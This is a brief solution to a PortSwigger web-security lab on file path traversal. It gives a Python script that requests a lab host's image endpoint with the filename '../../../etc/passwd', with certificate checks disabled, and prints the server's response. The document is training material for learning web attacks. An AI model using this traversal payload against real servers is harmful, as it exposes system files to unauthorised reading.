# Lab: File path traversal, simple case

link to lab: https://portswigger.net/web-security/file-path-traversal/lab-simple

Solution: 

```python
import requests

response = requests.get(
    'https://0a9600d703bbc529c08bc73900ca0039.web-security-academy.net/image?filename=../../../etc/passwd',
    verify=False,
)

print(response.text)
```